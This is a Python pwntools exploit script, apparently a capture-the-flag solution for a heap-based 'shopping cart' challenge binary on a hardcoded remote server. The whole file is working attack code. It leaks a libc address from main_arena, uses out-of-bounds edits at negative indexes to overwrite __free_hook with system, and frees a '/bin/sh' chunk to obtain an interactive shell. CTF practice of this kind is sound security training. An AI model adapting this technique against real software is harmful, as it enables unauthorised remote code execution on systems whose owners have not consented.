#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./task_shoppingCart"
libcPath = ""
remoteAddr = "49.4.78.132"
remotePort = 32320

context.binary = elfPath
elf = context.binary
'''
root@f025fe18dfff:~/shopping# main_arena ./libc.so.6
[+]__malloc_hook_offset : 0x3c4b10
[+]main_arena_offset : 0x3c4b20
'''
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)
libc.sym['main_arena'] = 0x3c4b20

context.log_level = "debug"
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    info("malloc -> {:#x}".format(0xA44))
    info("read -> {:#x}".format(0xA72))
    info("rax -> {:#x}".format(0xC6F))
    info("edit -> {:#x}".format(0xC83))
    info("print -> {:#x}".format(0xC57))
    raw_input("DEBUG: ")

def add(size, name):
    io.sendlineafter("buy!\n", "1")
    sleep(0.01)
    io.sendlineafter("name?\n", str(size))
    sleep(0.01)
    io.sendafter("name?", name)
    sleep(0.01)

def edit(idx, name):
    io.sendlineafter("buy!\n", "3")
    sleep(0.01)
    io.sendlineafter("modify?\n", str(idx))
    sleep(0.01)
    io.sendafter("to?\n", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("buy!\n", "2")
    sleep(0.01)
    io.sendlineafter("need?\n", str(idx))
    sleep(0.01)

if __name__ == "__main__":
    for i in xrange(0x14):
        io.sendlineafter("man!\n", "1")
        io.sendlineafter("Dollar?\n", str(i))
    io.sendlineafter("man!\n", "3")

    add(0xa0, '0000') # 0
    add(0x10, "/bin/sh\0") # 1
    delete(0)
    add(0, "") # 2
    #  edit(2, 'x')

    io.sendlineafter("buy!\n", "3")
    sleep(0.01)
    io.sendlineafter("modify?\n", str(2))
    sleep(0.01)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 248 - libc.sym['main_arena']
    success("libc", libc.address)
    io.sendafter("to?\n", 'x')
    sleep(0.01)

    edit(-1, p64(libc.got['__free_hook']))
    #  DEBUG()
    edit(-21, p64(libc.sym['system']))
    delete(1)

    io.interactive()
